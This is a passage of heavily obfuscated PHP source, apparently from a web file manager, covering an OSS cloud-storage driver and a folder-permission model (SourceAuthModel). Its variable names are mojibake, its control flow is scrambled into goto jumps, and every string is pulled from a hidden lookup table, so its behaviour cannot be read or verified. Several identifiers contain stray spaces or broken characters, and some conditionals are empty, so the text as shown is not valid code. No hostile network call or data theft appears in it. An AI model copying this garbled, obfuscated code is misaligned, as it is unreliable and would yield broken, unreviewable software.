rawurlencode($B«ôË•‹¶); $Dò­ªß¥”¢ = $this->link($aˆ “ÈÄ–ˆ, $dÔéğØä²Õ); goto e¸Ï¿ÈÌŠ; D×¶²¿ˆœ¯: $B«ôË•‹¶ = get_file_mime(get_path_ext($Bˆ¤Å¼ò±Ï)); if ($B«ôË•‹¶ == $d¢ÊÖ‹Å–[201]) { return parent::fileOut($aˆ “ÈÄ–ˆ, $d¹Ş„Šµé, $Bˆ¤Å¼ò±Ï, $c‹¿÷åéæé); } $d¹Ş„Šµé = $d¹Ş„Šµé ? $d¢ÊÖ‹Å–[202] : $d¢ÊÖ‹Å–[203]; goto b¶¸É³åÇ¥; e¸Ï¿ÈÌŠ: $this->fileOutLink($Dò­ªß¥”¢); goto EÈíØ®äÆâ; EÈíØ®äÆâ: } public function fileOutServer($BÚ”ÌèÙö, $eÆ†§É¶Ñ = false, $Aó™ºÅÉ ¦ = false, $c©ËåŸÎƒ = '') { parent::fileOut($BÚ”ÌèÙö, $eÆ†§É¶Ñ, $Aó™ºÅÉ ¦, $c©ËåŸÎƒ); } public function fileOutImage($eó‚òïÌÆÆ, $e»Óˆ‚ò®Š = 250) { $EášÛôõ² = array(OSS\OssClient::OSS_PROCESS => $_SERVER[³‘’¼äÑ™ÔÍ][1217] . $e»Óˆ‚ò®Š); $C²óô£ÛˆŠ = $this->link($eó‚òïÌÆÆ, $EášÛôõ²); $this->fileOutLink($C²óô£ÛˆŠ); } public function fileOutImageServer($DÙŒù®ì¹¯, $Cáö÷ = 250) { parent::fileOutImage($DÙŒù®ì¹¯, $Cáö÷); } public function fileOutLink($dø„Øß«õ) { $Ešï˜‚Æğ„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->isCdnHost() && substr($dø„Øß«õ, 0, 7) == $Ešï˜‚Æğ„[1119]) { $dø„Øß«õ = $Ešï˜‚Æğ„[1120] . substr($dø„Øß«õ, 7); } header($Ešï˜‚Æğ„[156] . $dø„Øß«õ); die; } public function hashMd5($BÏÕ„èçàª, $aÁİÜ÷º½ = '') { $F‡éÉà–Ò« =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÑÁÃ­•‚ = $this->objectMeta($BÏÕ„èçàª); if (!$FÑÁÃ­•‚) { return $F‡éÉà–Ò«[33]; } if (!isset($FÑÁÃ­•‚[$F‡éÉà–Ò«[1190]]) && !empty($aÁİÜ÷º½)) { $cÌî”•šà£ = $this->updateObjMeta($BÏÕ„èçàª, array($F‡éÉà–Ò«[1190] => $aÁİÜ÷º½)); $FÑÁÃ­•‚[$F‡éÉà–Ò«[1190]] = $cÌî”•šà£ ? $aÁİÜ÷º½ : $F‡éÉà–Ò«[33]; } return isset($FÑÁÃ­•‚[$F‡éÉà–Ò«[1190]]) ? strtolower($FÑÁÃ­•‚[$F‡éÉà–Ò«[1190]]) : $F‡éÉà–Ò«[33]; } public function size($dƒ…ØšŒá²) { $d”‘¡Şå¢Ã = $this->objectMeta($dƒ…ØšŒá²); return $d”‘¡Şå¢Ã ? $d”‘¡Şå¢Ã[$_SERVER[³‘’¼äÑ™ÔÍ][77]] : 0; } public function info($AÑ¶æÕî¢) { if ($this->isFolder($AÑ¶æÕî¢)) { return $this->folderInfo($AÑ¶æÕî¢); } else { if ($this->isFile($AÑ¶æÕî¢)) { return $this->fileInfo($AÑ¶æÕî¢); } } return !1; } public function exist($c½Ÿ„˜ÕŸ½) { return $this->isFile($c½Ÿ„˜ÕŸ½) || $this->isFolder($c½Ÿ„˜ÕŸ½); } public function isFile($Eš«ÜÑÂ„) { return !$this->isFolder($Eš«ÜÑÂ„) && $this->objectMeta($Eš«ÜÑÂ„); } public function isFolder($F¤ˆÀ½É¸‘) { return $this->cacheMethod($_SERVER[³‘’¼äÑ™ÔÍ][223], $F¤ˆÀ½É¸‘); } protected function objectMeta($dÌæßåâ‰‡) { return $this->cacheMethod($_SERVER[³‘’¼äÑ™ÔÍ][224], $dÌæßåâ‰‡); } protected function _objectMeta($bœÀÃ¯Ş‹›) { $B‹…æ½¶ôº =& $_SERVER[³‘’¼äÑ™ÔÍ]; try { $BÙ´äõî£Ô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($bœÀÃ¯Ş‹›)); } catch (OSS\Core\OssException $f²ä•¹¹ˆÓ) { $BÙ´äõî£Ô = !1; } if ($BÙ´äõî£Ô) { $BÙ´äõî£Ô[$B‹…æ½¶ôº[77]] = intval($BÙ´äõî£Ô[$B‹…æ½¶ôº[1197]]); } return $BÙ´äõî£Ô; } protected function _isFolder($C¥Ç¡Û½ñò) { $Càîšà±ÒÌ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($C¥Ç¡Û½ñò == $Càîšà±ÒÌ[33] || $C¥Ç¡Û½ñò == $Càîšà±ÒÌ[8]) { return !0; } $aï¿ñçÜó = array($Càîšà±ÒÌ[1187] => $Càîšà±ÒÌ[8], $Càîšà±ÒÌ[186] => rtrim($C¥Ç¡Û½ñò, $Càîšà±ÒÌ[8]) . $Càîšà±ÒÌ[8], $Càîšà±ÒÌ[1188] => 1, $Càîšà±ÒÌ[1189] => $Càîšà±ÒÌ[33]); $EÓñ÷Œ¤§¥ = $this->client->listObjects($this->bucket, $aï¿ñçÜó); if ($EÓñ÷Œ¤§¥->getObjectList() || $EÓñ÷Œ¤§¥->getPrefixList()) { return !0; } return !1; } } goto D»íŸ•àÖ³; dëˆá«¬Ôù: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\143\x65\137\x61\x75\164\x68"; public function getAuth($d¼¥à²éğ) { goto B³•¹“Í²›; bÇĞ°İÏí…: return $e¾²Š—»¢ë; goto BêÎË“×¢; B³•¹“Í²›: $c¤Õ²ãî‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AâíŞ•—Ñï = $c¤Õ²ãî‘[2262]; $EÃîË§Çñ  = array($c¤Õ²ãî‘[369] => $d¼¥à²éğ); goto A²•¥ÈáÖ¶; A²•¥ÈáÖ¶: $Bæø×ßîÚŸ = $this->field($AâíŞ•—Ñï)->order($c¤Õ²ãî‘[367])->where($EÃîË§Çñ )->select(); $e¾²Š—»¢ë = array(); foreach ($Bæø×ßîÚŸ as $BÙèáÜğ§Ö) { if (Model($c¤Õ²ãî‘[2263])->listData($BÙèáÜğ§Ö[$c¤Õ²ãî‘[2244]])) { $e¾²Š—»¢ë[] = $BÙèáÜğ§Ö; } } goto bÇĞ°İÏí…; BêÎË“×¢: } public function setAuth($e˜ƒŒ„–âİ, $dï§«šŸÈµ) { goto D·¾™½Çåõ; a¾·ù¾–Ù´: $this->where(array($c‰Î±ÖŠ¾[383] => $e˜ƒŒ„–âİ))->delete(); $this->addAll($c‡µ÷ÃòÊ™); return !0; goto fĞ‰âòçÙ; D·¾™½Çåõ: $c‰Î±ÖŠ¾ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D“ŒîÃ¤ÌŠ = Model($c‰Î±ÖŠ¾[1121])->sourceInfo($e˜ƒŒ„–âİ); if ($D“ŒîÃ¤ÌŠ[$c‰Î±ÖŠ¾[371]] != SourceModel::TYPE_GROUP) { return !1; } goto Bæ‚¹Ò­¬¾; e…öÍÊÎ®’: $aÅ´Šƒ®ù‹ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $c‡µ÷ÃòÊ™ = array(); foreach ($dï§«šŸÈµ as $D‡ÈÖ½­ËÓ) { if (!in_array($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[371]], $aÅ´Šƒ®ù‹)) { show_json(LNG($c‰Î±ÖŠ¾[2264]), !1); } if ($f·‹â×áõ„ != $FË‰°‰Á×Â) { if ($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[371]] == SourceModel::TYPE_GROUP) { } if ($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[456]] != 0 && !in_array($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[456]], $dØğ„•Îóæ)) { } } if ($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[456]] == 0) { $D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[371]] = SourceModel::TYPE_USER; } $c‡µ÷ÃòÊ™[] = array($c‰Î±ÖŠ¾[369] => $e˜ƒŒ„–âİ, $c‰Î±ÖŠ¾[371] => intval($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[371]]), $c‰Î±ÖŠ¾[456] => intval($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[456]]), $c‰Î±ÖŠ¾[2244] => intval($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[2244]]) ? intval($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[2244]]) : 0, $c‰Î±ÖŠ¾[2245] => intval($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[2245]]) ? intval($D‡ÈÖ½­ËÓ[$c‰Î±ÖŠ¾[2245]]) : -1); } goto a¾·ù¾–Ù´; Bæ‚¹Ò­¬¾: $FË‰°‰Á×Â = 1; $f·‹â×áõ„ = $D“ŒîÃ¤ÌŠ[$c‰Î±ÖŠ¾[456]]; if ($f·‹â×áõ„ != $FË‰°‰Á×Â) { $Aƒ¢ƒšèïŞ = array($c‰Î±ÖŠ¾[2113] => $f·‹â×áõ„); $dØğ„•Îóæ = Model($c‰Î±ÖŠ¾[2189])->field($c‰Î±ÖŠ¾[1445])->where($Aƒ¢ƒšèïŞ)->select(); $dØğ„•Îóæ = array_to_keyvalue($dØğ„•Îóæ, $c‰Î±ÖŠ¾[33], $c‰Î±ÖŠ¾[1445]); } goto e…öÍÊÎ®’; fĞ‰âòçÙ: } public function authClear($fÛÁ½º“‹) { $d÷Ü—À™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aà’ë²°® = Model($d÷Ü—À™[1121])->sourceInfo($fÛÁ½º“‹); $e„éœÏÉñ = array($fÛÁ½º“‹); if ($aà’ë²°®[$d÷Ü—À™[370]] == $d÷Ü—À™[83]) { $e‡Ê¿ÊŒ = array($d÷Ü—À™[525] => array($d÷Ü—À™[483], $aà’ë²°®[$d÷Ü—À™[459]] . $fÛÁ½º“‹ . $d÷Ü—À™[484])); $e„éœÏÉñ = Model($d÷Ü—À™[1121])->field($d÷Ü—À™[383])->where($e‡Ê¿ÊŒ)->getField($d÷Ü—À™[369], !0); $e„éœÏÉñ[] = $fÛÁ½º“‹; } $this->where(array($d÷Ü—À™[383] => array($d÷Ü—À™[384], $e„éœÏÉñ)))->delete(); return !0; } public function get($cæïÂŞÚ÷) { $bÃ°î¿¡Ã = $this->getSourceList(array($cæïÂŞÚ÷), !0); return $bÃ°î¿¡Ã[0]; } public function getSourceList($AÛŒåùØÇ˜, $CõÚé¯ë¹ = false) { goto b±‚›”Î…; aõ¦õ¬Üá²: $E´­’´Æ˜” = array_values(array_unique($E´­’´Æ˜”)); if (!$E´­’´Æ˜”) { return array(); } $fºÏ¥‡•ÌŠ = $bµ²ï­[2266]; goto e‚ùªƒøÆ‡; F‰ø§´î–¿: $bÉˆœ£èÜˆ = array(); foreach ($CõÚé¯ë¹ as $E¨ËË¥ï®± => $c¼éÙ‹±Òù) { $bÉˆœ£èÜˆ[$E¨ËË¥ï®±] = $this->makeSourceAuth($c¼éÙ‹±Òù, $a ñÄ çˆ¥); } return $bÉˆœ£èÜˆ; goto DØ®„¶Ø‡; b±‚›”Î…: $bµ²ï­ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$AÛŒåùØÇ˜) { return array(); } $D¡ê½¦¨ˆ = Model($bµ²ï­[1121]); goto E¤ŠÎÀ¤â›; E¤ŠÎÀ¤â›: if (!$CõÚé¯ë¹) { $d£êµŒÂºŒ = array($bµ²ï­[383] => array($bµ²ï­[384], $AÛŒåùØÇ˜)); $CõÚé¯ë¹ = $D¡ê½¦¨ˆ->field($bµ²ï­[2265])->where($d£êµŒÂºŒ)->select(); $CõÚé¯ë¹ = array_to_keyvalue($CõÚé¯ë¹, $bµ²ï­[369]); } $E´­’´Æ˜” = $AÛŒåùØÇ˜; foreach ($CõÚé¯ë¹ as $D¨ğå‹‡°ë => $a¦ˆÓÃ¸¼º) { $cÉ«¹ˆˆÉ« = $D¡ê½¦¨ˆ->parentLevelArray($a¦ˆÓÃ¸¼º[$bµ²ï­[459]]); $E´­’´Æ˜” = array_merge($E´­’´Æ˜”, $cÉ«¹ˆˆÉ«, array($D¨ğå‹‡°ë)); } goto aõ¦õ¬Üá²; e‚ùªƒøÆ‡: $d£êµŒÂºŒ = array($bµ²ï­[383] => array($bµ²ï­[384], $E´­’´Æ˜”)); $a ñÄ çˆ¥ = $this->field($fºÏ¥‡•ÌŠ)->where($d£êµŒÂºŒ)->select(); $a ñÄ çˆ¥ = array_to_keyvalue_group($a ñÄ çˆ¥, $bµ²ï­[369]); goto F‰ø§´î–¿; DØ®„¶Ø‡: } public function authDeepCheck($EòÜŠê’¨¤) { goto Bª¸º“¤¤˜; eÌí£ÊÕ: if (!in_array($EòÜŠê’¨¤, $FÒá’ÓèÍ[$aÊÂ•Ø‡–¹[2267]])) { return !1; } $Cˆ™Ã½»²» = array(); foreach ($FÒá’ÓèÍ[$aÊÂ•Ø‡–¹[2268]] as $Fà„Œ¥İŸ => $Bš³Õˆ„§·) { if (!in_array($EòÜŠê’¨¤, $Bš³Õˆ„§·)) { continue; } $Cˆ™Ã½»²»[] = $Fà„Œ¥İŸ; } goto FøñÊí¬´; Bª¸º“¤¤˜: $aÊÂ•Ø‡–¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (_get($GLOBALS, $aÊÂ•Ø‡–¹[457])) { return !1; } $FÒá’ÓèÍ = $this->makeAuthDeep(); goto eÌí£ÊÕ; FøñÊí¬´: $AŒø­Äİ¸ = $Cˆ™Ã½»²» ? $Cˆ™Ã½»²»[0] : $EòÜŠê’¨¤; return array($aÊÂ•Ø‡–¹[377] => -1, $aÊÂ•Ø‡–¹[418] => array($aÊÂ•Ø‡–¹[385] => $aÊÂ•Ø‡–¹[1035], $aÊÂ•Ø‡–¹[2119] => $aÊÂ•Ø‡–¹[468], $aÊÂ•Ø‡–¹[386] => LNG($aÊÂ•Ø‡–¹[2269]), $aÊÂ•Ø‡–¹[2131] => $aÊÂ•Ø‡–¹[2270]), $aÊÂ•Ø‡–¹[2271] => array($aÊÂ•Ø‡–¹[388] => $aÊÂ•Ø‡–¹[2272], $aÊÂ•Ø‡–¹[75] => $AŒø­Äİ¸)); goto aĞÆ—Ûá¥î; aĞÆ—Ûá¥î: } protected function makeAuthDeep() { goto dñ’ºàøáó; Eã»ŒŠòƒ°: $E¿ßäĞ– = Model($f³ùˆÀÊ…é[2273])->listData(); $B°÷•á§õ† = array(); foreach ($E¿ßäĞ– as $eÙ„¢’ƒƒ½) { if ($eÙ„¢’ƒƒ½[$f³ùˆÀÊ…é[376]] == 0 && $eÙ„¢’ƒƒ½[$f³ùˆÀÊ…é[2133]] == $f³ùˆÀÊ…é[83]) { $B°÷•á§õ†[] = $eÙ„¢’ƒƒ½[$f³ùˆÀÊ…é[367]]; } } goto BØÏÆèìì§; BØÏÆèìì§: $añ¦œ±š²Á = Session::get($f³ùˆÀÊ…é[2228]); $añ¦œ±š²Á = array_to_keyvalue($añ¦œ±š²Á, $f³ùˆÀÊ…é[33], $f³ùˆÀÊ…é[2113]); $bÙùšà»Ş = array($f³ùˆÀÊ…é[371] => SourceModel::TYPE_USER, $f³ùˆÀÊ…é[456] => USER_ID); goto Dˆ»”©õ÷¯; Aİ‰Ñ£…ö—: return $DÓ×Úì“¬; goto bØêğàºÄ˜; b¨°²¬§Èù: foreach ($eÈËíÇì¤ as $cœñ”¥¹‡) { $f…ƒ¶Îİ¡ß = $eŸ¼¶«ÊŒ->getInfo($cœñ”¥¹‡); $eµ¸íĞ¢‚Ô = $C¯¨“¹«’->parentLevelArray($f…ƒ¶Îİ¡ß[$f³ùˆÀÊ…é[459]]); $bÆ» Ä™ñˆ = array_merge($bÆ» Ä™ñˆ, $eµ¸íĞ¢‚Ô); } $bÆ» Ä™ñˆ = array_values(array_unique($bÆ» Ä™ñˆ)); foreach ($bÆ» Ä™ñˆ as $cœñ”¥¹‡) { $f…ƒ¶Îİ¡ß = $eŸ¼¶«ÊŒ->getInfo($cœñ”¥¹‡); $fÍ¥çŞ÷Á¬[] = $f…ƒ¶Îİ¡ß[$f³ùˆÀÊ…é[391]][$f³ùˆÀÊ…é[369]]; $b„˜º¬›[$cœñ”¥¹‡] = $f…ƒ¶Îİ¡ß[$f³ùˆÀÊ…é[391]][$f³ùˆÀÊ…é[369]]; $dÑŠöôóçÅ[$cœñ”¥¹‡] = $C¯¨“¹«’->parentLevelArray($f…ƒ¶Îİ¡ß[$f³ùˆÀÊ…é[459]]); } goto c’•·Õğç¾; Bêù×ØºÃ: if ($Cµ‘Ÿ¢¹Ë) { $EŸäß•Ã¬Ñ = $C¯¨“¹«’->where(array($f³ùˆÀÊ…é[369] => array($f³ùˆÀÊ…é[384], $Cµ‘Ÿ¢¹Ë)))->select(); foreach ($EŸäß•Ã¬Ñ as $C†×Šº˜ñ) { $eµ¸íĞ¢‚Ô = $C¯¨“¹«’->parentLevelArray($C†×Šº˜ñ[$f³ùˆÀÊ…é[459]]); $fÍ¥çŞ÷Á¬ = array_merge($fÍ¥çŞ÷Á¬, $eµ¸íĞ¢‚Ô); $bÆ» Ä™ñˆ[] = $C†×Šº˜ñ[$f³ùˆÀÊ…é[456]]; $F¿¾•‡ôë‰[$C†×Šº˜ñ[$f³ùˆÀÊ…é[369]]] = $eµ¸íĞ¢‚Ô; $DÍ¨É’¯á…[$C†×Šº˜ñ[$f³ùˆÀÊ…é[369]]] = $C†×Šº˜ñ[$f³ùˆÀÊ…é[456]]; } } $bÆ» Ä™ñˆ = array_values(array_unique($bÆ» Ä™ñˆ)); $eÈËíÇì¤ = $bÆ» Ä™ñˆ; goto b¨°²¬§Èù; côŸäà‡»: $DÍ¨É’¯á… = array(); $b„˜º¬› = array(); $dÑŠöôóçÅ = array(); goto Bêù×ØºÃ; dñ’ºàøáó: $f³ùˆÀÊ…é =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $DÓ×Úì“¬ = false; if ($DÓ×Úì“¬) { return $DÓ×Úì“¬; } goto Eã»ŒŠòƒ°; Dˆ»”©õ÷¯: if ($añ¦œ±š²Á) { $bÙùšà»Ş = array(array($f³ùˆÀÊ…é[371] => SourceModel::TYPE_USER, $f³ùˆÀÊ…é[456] => USER_ID), array($f³ùˆÀÊ…é[371] => SourceModel::TYPE_GROUP, $f³ùˆÀÊ…é[456] => array($f³ùˆÀÊ…é[384], $añ¦œ±š²Á)), $f³ùˆÀÊ…é[918] => $f³ùˆÀÊ…é[2195]); } if ($B°÷•á§õ†) { $bÙùšà»Ş = array($bÙùšà»Ş, $f³ùˆÀÊ…é[2244] => array($f³ùˆÀÊ…é[2274], $B°÷•á§õ†)); } $F²½‚Ù¹ºØ = $this->field($f³ùˆÀÊ…é[2275])->where($bÙùšà»Ş)->select(); goto EÃÙì§¯¦×; eƒ†ÈÃ‘ù¬: $C¯¨“¹«’ = Model($f³ùˆÀÊ…é[1121]); $eŸ¼¶«ÊŒ = Model($f³ùˆÀÊ…é[458]); $F¿¾•‡ôë‰ = array(); goto côŸäà‡»; c’•·Õğç¾: foreach ($F¿¾•‡ôë‰ as $dôÖÛ†—Â => $C—ÜÑÆ¥••) { $eºçóÌ‚®ê = $DÍ¨É’¯á…[$dôÖÛ†—Â]; if (!$eºçóÌ‚®ê || !$b„˜º¬›[$eºçóÌ‚®ê]) { continue; } $F§íƒíÕéì = array(); foreach ($dÑŠöôóçÅ[$eºçóÌ‚®ê] as $cœñ”¥¹‡) { $F§íƒíÕéì[] = $b„˜º¬›[$cœñ”¥¹‡]; } $F¿¾•‡ôë‰[$dôÖÛ†—Â] = array_merge($F§íƒíÕéì, $C—ÜÑÆ¥••); } $fÍ¥çŞ÷Á¬ = array_values(array_unique($fÍ¥çŞ÷Á¬)); $DÓ×Úì“¬ = array($f³ùˆÀÊ…é[2267] => $fÍ¥çŞ÷Á¬, $f³ùˆÀÊ…é[2268] => $F¿¾•‡ôë‰); goto Aİ‰Ñ£…ö—; EÃÙì§¯¦×: $Cµ‘Ÿ¢¹Ë = array_to_keyvalue($F²½‚Ù¹ºØ, $f³ùˆÀÊ…é[33], $f³ùˆÀÊ…é[369]); $fÍ¥çŞ÷Á¬ = array(); $bÆ» Ä™ñˆ = $añ¦œ±š²Á; goto eƒ†ÈÃ‘ù¬; bØêğàºÄ˜: } private function makeSourceAuth($B…ŒÍ¢ÉĞ¡, $cœˆÇÙ•¦ö) { goto b³ªöç²–º; b³ªöç²–º: $EÛÍçƒ½ÇŒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FË±ÄÏ²¼˜ = Session::get($EÛÍçƒ½ÇŒ[2228]); $FË±ÄÏ²¼˜ = array_to_keyvalue($FË±ÄÏ²¼˜, $EÛÍçƒ½ÇŒ[2113]); goto B²é„õ†µÏ; eò®îÓğÏ: $BÁ‡ã•éİĞ = !1; foreach ($f¯æÕíÄã« as $b´åç³¬œ) { if (!isset($cœˆÇÙ•¦ö[$b´åç³¬œ])) { continue; } $fìƒãÏ¡Ç… = $this->authMake($cœˆÇÙ•¦ö[$b´åç³¬œ]); if ($fìƒãÏ¡Ç…[$EÛÍçƒ½ÇŒ[418]]) { $BÁ‡ã•éİĞ = $fìƒãÏ¡Ç…; break; } } if (!$b„éççÅâ) { return $BÁ‡ã•éİĞ; } goto c÷Ì‡ÊŸ; Fİ·¶‡·Îï: return $BÁ‡ã•éİĞ; goto bŞá¡æ„õÚ; d›²†ñºáÔ: $BÇâËƒæ‡  = $B…ŒÍ¢ÉĞ¡[$EÛÍçƒ½ÇŒ[456]]; $b„éççÅâ = $B…ŒÍ¢ÉĞ¡[$EÛÍçƒ½ÇŒ[371]] == SourceModel::TYPE_GROUP; if ($b„éççÅâ && isset($FË±ÄÏ²¼˜[$BÇâËƒæ‡ ]) && !_get($GLOBALS, $EÛÍçƒ½ÇŒ[457])) { $cº¸Òê¡õ• = $FË±ÄÏ²¼˜[$BÇâËƒæ‡ ]; if (Model($EÛÍçƒ½ÇŒ[2263])->authCheckRoot($cº¸Òê¡õ•[$EÛÍçƒ½ÇŒ[376]][$EÛÍçƒ½ÇŒ[376]])) { $CŒ÷‘ª«´‹ = Model($EÛÍçƒ½ÇŒ[458])->getInfo($BÇâËƒæ‡ ); $BÁ‡ã•éİĞ = array($EÛÍçƒ½ÇŒ[2276] => intval($cº¸Òê¡õ•[$EÛÍçƒ½ÇŒ[376]][$EÛÍçƒ½ÇŒ[376]]), $EÛÍçƒ½ÇŒ[2277] => $cº¸Òê¡õ•[$EÛÍçƒ½ÇŒ[376]], $EÛÍçƒ½ÇŒ[2271] => array($EÛÍçƒ½ÇŒ[388] => $EÛÍçƒ½ÇŒ[2278], $EÛÍçƒ½ÇŒ[2279] => $CŒ÷‘ª«´‹[$EÛÍçƒ½ÇŒ[391]][$EÛÍçƒ½ÇŒ[369]], $EÛÍçƒ½ÇŒ[2280] => $CŒ÷‘ª«´‹[$EÛÍçƒ½ÇŒ[463]])); return $BÁ‡ã•éİĞ; } } goto eò®îÓğÏ; c÷Ì‡ÊŸ: if (!$BÁ‡ã•éİĞ && isset($FË±ÄÏ²¼˜[$BÇâËƒæ‡ ])) { $cº¸Òê¡õ• = $FË±ÄÏ²¼˜[$BÇâËƒæ‡ ]; $CŒ÷‘ª«´‹ = Model($EÛÍçƒ½ÇŒ[458])->getInfo($BÇâËƒæ‡ ); $BÁ‡ã•éİĞ = array($EÛÍçƒ½ÇŒ[2276] => intval($cº¸Òê¡õ•[$EÛÍçƒ½ÇŒ[376]][$EÛÍçƒ½ÇŒ[376]]), $EÛÍçƒ½ÇŒ[2277] => $cº¸Òê¡õ•[$EÛÍçƒ½ÇŒ[376]], $EÛÍçƒ½ÇŒ[2271] => array($EÛÍçƒ½ÇŒ[388] => $EÛÍçƒ½ÇŒ[2281], $EÛÍçƒ½ÇŒ[75] => $CŒ÷‘ª«´‹[$EÛÍçƒ½ÇŒ[391]][$EÛÍçƒ½ÇŒ[369]], $EÛÍçƒ½ÇŒ[2280] => $CŒ÷‘ª«´‹[$EÛÍçƒ½ÇŒ[463]])); } if (!$BÁ‡ã•éİĞ) { $CŒ÷‘ª«´‹ = Model($EÛÍçƒ½ÇŒ[458])->getInfo($BÇâËƒæ‡ ); $Eêø¶Î‚µ× = explode($EÛÍçƒ½ÇŒ[47], trim($CŒ÷‘ª«´‹[$EÛÍçƒ½ÇŒ[459]], $EÛÍçƒ½ÇŒ[47])); foreach ($Eêø¶Î‚µ× as $bÒø˜ôñø) { if ($bÒø˜ôñø == $EÛÍçƒ½ÇŒ[468] || $bÒø˜ôñø == $E¶¹Ò®çÛ) { continue; } if (!isset($FË±ÄÏ²¼˜[$bÒø˜ôñø])) { continue; } $cº¸Òê¡õ• = $FË±ÄÏ²¼˜[$bÒø˜ôñø]; $BÁ‡ã•éİĞ = array($EÛÍçƒ½ÇŒ[2276] => intval($cº¸Òê¡õ•[$EÛÍçƒ½ÇŒ[376]][$EÛÍçƒ½ÇŒ[376]]), $EÛÍçƒ½ÇŒ[2277] => $cº¸Òê¡õ•[$EÛÍçƒ½ÇŒ[376]], $EÛÍçƒ½ÇŒ[2271] => array($EÛÍçƒ½ÇŒ[388] => $EÛÍçƒ½ÇŒ[2278], $EÛÍçƒ½ÇŒ[2279] => $CŒ÷‘ª«´‹[$EÛÍçƒ½ÇŒ[391]][$EÛÍçƒ½ÇŒ[369]], $EÛÍçƒ½ÇŒ[2280] => $CŒ÷‘ª«´‹[$EÛÍçƒ½ÇŒ[463]])); break; } } if (!$BÁ‡ã•éİĞ || $BÁ‡ã•éİĞ[$EÛÍçƒ½ÇŒ[377]] <= 0) { $EœäÅÎ¶é = $this->authDeepCheck($B…ŒÍ¢ÉĞ¡[$EÛÍçƒ½ÇŒ[369]]); if ($EœäÅÎ¶é) { $BÁ‡ã•éİĞ = $EœäÅÎ¶é; } } goto Fİ·¶‡·Îï; B²é„õ†µÏ: $E¶¹Ò®çÛ = $EÛÍçƒ½ÇŒ[83]; $f¯æÕíÄã« = Model($EÛÍçƒ½ÇŒ[1121])->parentLevelArray($B…ŒÍ¢ÉĞ¡[$EÛÍçƒ½ÇŒ[459]]); $f¯æÕíÄã« = array_merge(array($B…ŒÍ¢ÉĞ¡[$EÛÍçƒ½ÇŒ[369]]), array_reverse($f¯æÕíÄã«)); goto d›²†ñºáÔ; bŞá¡æ„õÚ: } public function authOwnerApply($eé’ğÇèß£) { goto bªİ ³áÃ…; dÙ•Ş¥£ÛÃ: $fğ‘ßŠÏ† = array(); $d™«×Ãã‡ = array(); foreach ($f•äùÏ®Ò± as $f›ò»ØïÒ  => $fÙ–‹˜åÈ‰) { $C¬óé£µ“‡ = $this->authFolderOwnerUser($fÙ–‹˜åÈ‰); $fğ‘ßŠÏ†[$f›ò»ØïÒ ] = $C¬óé£µ“‡; $d™«×Ãã‡ = array_merge($d™«×Ãã‡, $C¬óé£µ“‡[$Eß¥Š×ğ¶—[535]]); if ($C¬óé£µ“‡[$Eß¥Š×ğ¶—[2283]]) { break; } } goto c·‡¢´ª; Aªñ®È¥ä: $A™÷È÷Úè = Model($Eß¥Š×ğ¶—[1121])->parentLevelArray($eé’ğÇèß£[$Eß¥Š×ğ¶—[459]]); $A™÷È÷Úè = array_merge(array($eé’ğÇèß£[$Eß¥Š×ğ¶—[369]]), array_reverse($A™÷È÷Úè)); $b¶£èéÂğ¡ = $Eß¥Š×ğ¶—[2266]; goto C÷òÂØÀ÷; C÷òÂØÀ÷: $cÄ¢ƒÒ¯Ó¶ = array($Eß¥Š×ğ¶—[383] => array($Eß¥Š×ğ¶—[384], $A™÷È÷Úè)); $f•äùÏ®Ò± = $this->field($b¶£èéÂğ¡)->where($cÄ¢ƒÒ¯Ó¶)->select(); $f•äùÏ®Ò± = array_to_keyvalue_group($f•äùÏ®Ò±, $Eß¥Š×ğ¶—[369]); goto dÙ•Ş¥£ÛÃ; c·‡¢´ª: if (count($d™«×Ãã‡) == 0) { $d™«×Ãã‡ = $this->authFolderOwnerGroup($eé’ğÇèß£[$Eß¥Š×ğ¶—[456]]); } $d™«×Ãã‡ = array_unique($d™«×Ãã‡); if (AuthModel::authCheckRoot($eé’ğÇèß£[$Eß¥Š×ğ¶—[376]][$Eß¥Š×ğ¶—[377]])) { $d™«×Ãã‡[] = USER_ID; } goto d¸¶°Ë…ßÈ; d¸¶°Ë…ßÈ: $eé’ğÇèß£[$Eß¥Š×ğ¶—[376]][$Eß¥Š×ğ¶—[2284]] = Model($Eß¥Š×ğ¶—[474])->userListInfo($d™«×Ãã‡); return $eé’ğÇèß£; goto C£¢¼Ç°‡¶; bªİ ³áÃ…: $Eß¥Š×ğ¶— =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($eé’ğÇèß£[$Eß¥Š×ğ¶—[376]]) || isset($eé’ğÇèß£[$Eß¥Š×ğ¶—[2282]]) && $eé’ğÇèß£[$Eß¥Š×ğ¶—[2282]]) { return $eé’ğÇèß£; } if (AuthModel::authCheckRoot($eé’ğÇèß£[$Eß¥Š×ğ¶—[376]][$Eß¥Š×ğ¶—[377]])) { return $eé’ğÇèß£; } goto Aªñ®È¥ä; C£¢¼Ç°‡¶: } private function authFolderOwnerGroup($bà—òÈ½ÒÎ) { $D†‚Û‡Š½‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a¯°è„¸ = Model($D†‚Û‡Š½‘[2189])->where(array($D†‚Û‡Š½‘[2113] => $bà—òÈ½ÒÎ))->select(); 